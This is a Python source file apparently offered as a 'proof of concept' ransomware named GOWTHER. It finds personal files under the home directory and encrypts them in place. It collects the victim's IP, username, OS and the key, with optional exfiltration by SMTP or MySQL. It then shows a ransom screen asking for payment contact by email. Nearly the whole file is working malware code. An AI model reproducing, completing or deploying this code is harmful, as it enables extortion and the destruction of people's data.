#!/usr/bin/env python
#Author: Intrackeable
#Github: https://github.com/intrackeable

import os, smtplib, platform, random, requests, pymysql, pwd
from datetime import datetime
from os import path
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from cryptography.fernet import Fernet
from tkinter import *
from tkinter import ttk

def Discover_Files(victimlist):

    home = os.environ['HOME']
    folders = os.listdir(home)
    folders = [x for x in folders if not x.startswith('.')] #Eliminate hide folders in linux systems

    extensions = ['.jpg', '.jpeg', '.gif', '.mp3', '.mp4', '.wav', '.avi', '.pdf', '.docx', '.rar', '.tar', '.txt', '.csv', '.doc', '.xls', '.xlsx', '.ppt', '.pptx', '.raw', '.zip']
                 
    for u in folders:
        mainpath = home + '/' + u
        for ext in extensions:
            for mainfolder, dirs, files in os.walk(mainpath):
                for file in files:
                    if file.endswith(ext):
                        victimlist.append(os.path.join(mainfolder, file))

def Generate_Key():
    secretkey = Fernet.generate_key()
    return secretkey

def Generate_Random_ID():
    idnumber = random.randint(10000000000000000,999999999999999999999999999)
    return idnumber
    
def Encrypt_File(f,filename):

    with open(filename,'rb') as file: 
        file_content = file.read() #Read file with binary mode
        file.close()

    encrypted_data = f.encrypt(file_content) #Encrypt all content

    with open(filename, 'wb') as file:

        file.write(encrypted_data) #open again and replace with encrypted data
        file.close()
    
def Encrypt_File_List(key,victimlist):

    f = Fernet(key)

    for i in victimlist:
            Encrypt_File(f,i)

def Create_File_Paths(victimlist):

    file = open('victims','w')
    for i in victimlist:
        file.write(i+'\n')
    file.close()

def Send_To_Server(key,idnumber):

    enable_SQL = False #Enable this to select sending mode
    enable_SMTP = False

    ip = requests.get('https://api.ipify.org').text
    user = pwd.getpwuid(os.geteuid())[0]
    op = platform.system()
    datenow = datetime.now()
    key = key.decode('utf-8')

    data = 'IP: {} \nUser: {} \nKey: {} \nDate: {} \nOperating System: {} \nID: {} \n'.format(ip,user,key,datenow,op,idnumber)
    file = open(user,'w')
    file.write(data)
    file.close()

    if enable_SMTP == True:

        Send_SMTP(data)

    elif enable_SQL == True:

        MySQL_Connect(ip,user,op,datenow,idnumber,key)

def MySQL_Connect(ip,user,op,datenow,idnumber,key):

    database = pymysql.connect(host='host', user='user', password='password', db='RANSOMWARE') #Set your credentials here
    query = "INSERT INTO LOGS VALUES (NULL, '{}', '{}', '{}', '{}', '{}', '{}' );".format(user,ip,key,idnumber,op,datenow)
    try:
        with database.cursor() as cursor:
            cursor.execute(query)
            database.commit()
    except:
        database.rollback()
    finally:
        database.close()

def Send_SMTP(data):

    msj = MIMEMultipart()
    password = 'password' #Set email and password here
    msj['From'] = 'email'
    msj['To'] = 'email'
    msj['Subject'] = 'INFECTED'

    msj.attach(MIMEText(data, 'plain'))
    try:
        server = smtplib.SMTP('smtp.gmail.com: 587')
        server.starttls()
        server.login(msj['From'], password)
        server.sendmail(msj['From'], msj['To'], msj.as_string())
        server.quit()
    except:
        print('SMTP CONNECTION ERROR')

class RansomGUI:
    def __init__(self):
        self.window = Tk()
        self.window.title('GOWTHER RANSOMWARE')
        self.window.geometry('430x540')
        self.window.configure(background='red')
        self.randomkey = StringVar()

        self.info1 = ttk.Label(foreground='yellow', background='red',font=("Arial Bold", 20),text="DON'T PANIC!")
        self.info2 = ttk.Label(foreground='yellow', background='red',font=("Arial Bold", 16),text='YOUR FILES HAVE BEEN ENCRYPTED!')
        self.info3 = Message(foreground='black', background='white',font=("Arial Bold", 11),text="Hello,all your personal files like photos, videos and others, were locked using AES encryption. Your private decryption key has been created and stored on a secure and anonymous server, if you don't pay, the files will be lost. Send an email to ransonware@protonmail.com adding the ID, and follow the instructions.\nJust kidding, this is a proof of concept.")
        self.info4 = ttk.Label(foreground='yellow', background='red',font=("Arial Bold", 12),text="DECRYPTION KEY:")
        self.caja = ttk.Entry(width=36,textvariable=self.randomkey)
        self.boton = ttk.Button(text='RECOVER MY FILES!',command=self.Decrypt_File_List)

        self.logo = PhotoImage(file='logo.png')
        self.image = ttk.Label(image=logo, background='red')

        self.info1.pack()
        self.info2.pack()
        self.info3.pack()
        self.image.pack()
        self.info4.pack()
        self.caja.pack()
        self.boton.pack()
        self.window.mainloop()
    
    def Decrypt_File_List(self):

        key = self.randomkey.get()

        if path.exists('victims'):

            with open('victims','r') as victimspaths:
                pathlist = victimspaths.read().split('\n')
                pathlist = [x for x in pathlist if not x == ''] #Eliminate empty elements
                victimspaths.close()

            f = Fernet(key)

            for filename in pathlist:
                try:
                    with open(filename,'rb') as file:
                        file_content = file.read()
                        file.close()

                    decrypted_data = f.decrypt(file_content)
        
                    with open(filename, 'wb') as file:
                        file.write(decrypted_data)
                        file.close()
                except:
                    print('INVALID KEY')

def main():
    if not path.exists('victims'):    
        victimlist = []
        Discover_Files(victimlist)
        idnumber = Generate_Random_ID()
        key = Generate_Key()
        Encrypt_File_List(key,victimlist)
        Send_To_Server(key,idnumber)
        Create_File_Paths(victimlist)
        Ransomware = RansomGUI()
    else:
        Ransomware = RansomGUI()

if __name__ == '__main__':
    main()
    